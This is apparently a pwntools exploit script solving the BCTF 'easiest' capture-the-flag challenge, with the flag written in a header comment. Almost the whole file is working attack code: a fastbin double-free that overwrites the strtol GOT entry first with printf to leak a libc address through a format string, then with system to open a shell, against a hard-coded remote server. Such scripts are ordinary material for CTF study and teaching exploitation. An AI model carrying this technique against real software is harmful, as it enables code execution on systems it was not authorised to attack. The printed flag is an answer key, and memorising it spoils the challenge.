#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'
# BCTF{**No_mO7e_EasieR_HEaP_NowadayS!**}
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './easiest'
TARGET = ('39.96.9.148', 9999)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})
    
def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def add(idx, size, data):
    r.sendlineafter('2 delete \n', '1')
    r.sendlineafter('(0-11):', str(idx))
    r.sendlineafter('Length:', str(size))
    r.sendlineafter('C:', data)

def del1(idx):
    r.sendlineafter('2 delete \n', '2')
    r.sendlineafter('(0-11):', str(idx))

def del2(idx):
    r.sendlineafter('2 delete \n', '22')
    r.sendlineafter('(0-11):', str(idx))
    
code = ELF(BINARY)
libc = ELF(LIBC64)

add(0, 0x68, 'a'*8)
add(1, 0x68, 'a'*8)
add(2, 0x68, 'a'*8)

del1(0)
del1(1)
del1(0)

add(3, 0x68, p64(0x602045))
add(4, 0x68, 'a')
add(5, 0x68, 'a')

#attach(0x400a3a)

p  = '\x7f\x00\x00'
p += p64(0x71)
p += p64(code.plt['printf'])[:-1] #strtol
add(6, 0x68, p)
r.sendlineafter('2 delete \n', '%7$p')
libc.address = int(r.recv(14), 16) - 0x7a81b
log.info('libc base 0x%x' % libc.address)

del2(4)
del2(5)
del2(4)

add(9, 0x68, p64(0x602045))
add(10, 0x68, 'a')
add(11, 0x68, 'a')

p  = '\x7f\x00\x00'
p += p64(0x71)
p += p64(libc.sym['system'])[:-1] #strtol
add(0, 0x68, p)

r.sendlineafter('2 delete \n', '/bin/sh\x00')

r.interactive()
    
